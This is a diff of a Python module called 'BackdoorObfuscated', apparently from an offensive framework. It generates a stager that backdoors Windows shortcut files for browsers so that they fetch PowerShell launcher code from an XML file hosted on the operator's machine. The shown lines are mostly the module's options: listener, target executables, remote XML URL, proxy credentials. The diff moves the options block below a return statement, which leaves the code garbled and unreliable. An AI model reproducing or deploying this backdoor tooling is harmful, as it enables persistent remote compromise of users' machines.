@@ -8,60 +8,6 @@ def __init__(self, mainMenu, params=[]):
         self.info = {
             'Name': 'BackdoorObfuscated',
             'Author': ['4po (@apo#0001)'],
-        }
-xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(4,8)))
-
-        self.options = {
-            'Listener' : {
-                'Description'   :   'Listener to generate stager for.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Language' : {
-                'Description'   :   'Language of the launcher to generate.',
-                'Required'      :   True,
-                'Value'         :   'powershell'
-            },
-	    'TargetEXEs' : {
-                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
-                'Required'      :   True,
-                'Value'         :   'iexplore,firefox,chrome'
-            },
-            'XmlUrl' : {
-                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
-                'Required'      :   True,
-                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
-            },
-            'OutFile' : {
-                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
-                'Required'      :   False,
-                'Value'         :   '/tmp/macro'
-            },
-	    'XmlOutFile' : {
-                'Description'   :   'Local path + file to output xml to.',
-                'Required'      :   True,
-                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
-            },
-            'UserAgent' : {
-                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
-            'Proxy' : {
-                'Description'   :   'Proxy to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            },
- 	    'StagerRetries' : {
-                'Description'   :   'Times for the stager to retry connecting.',
-                'Required'      :   False,
-                'Value'         :   '0'
-            },
-            'ProxyCreds' : {
-                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required'      :   False,
-                'Value'         :   'default'
-            }
 
         }
 
@@ -188,4 +134,58 @@ xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, 
 
             return macro
 
-	
+	        }
+xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, random.randint(4,8)))
+
+        self.options = {
+            'Listener' : {
+                'Description'   :   'Listener to generate stager for.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Language' : {
+                'Description'   :   'Language of the launcher to generate.',
+                'Required'      :   True,
+                'Value'         :   'powershell'
+            },
+	    'TargetEXEs' : {
+                'Description'   :   'Will backdoor .lnk files pointing to selected executables (do not include .exe extension), enter a comma seperated list of target exe names - ex. iexplore,firefox,chrome',
+                'Required'      :   True,
+                'Value'         :   'iexplore,firefox,chrome'
+            },
+            'XmlUrl' : {
+                'Description'   :   'remotely-accessible URL to access the XML containing launcher code.',
+                'Required'      :   True,
+                'Value'         :   "http://" + helpers.lhost() + "/"+xmlVar+".xml"
+            },
+            'OutFile' : {
+                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
+                'Required'      :   False,
+                'Value'         :   '/tmp/macro'
+            },
+	    'XmlOutFile' : {
+                'Description'   :   'Local path + file to output xml to.',
+                'Required'      :   True,
+                'Value'         :   '/var/www/html/'+xmlVar+'.xml'
+            },
+            'UserAgent' : {
+                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+            'Proxy' : {
+                'Description'   :   'Proxy to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            },
+ 	    'StagerRetries' : {
+                'Description'   :   'Times for the stager to retry connecting.',
+                'Required'      :   False,
+                'Value'         :   '0'
+            },
+            'ProxyCreds' : {
+                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
+                'Required'      :   False,
+                'Value'         :   'default'
+            }
+
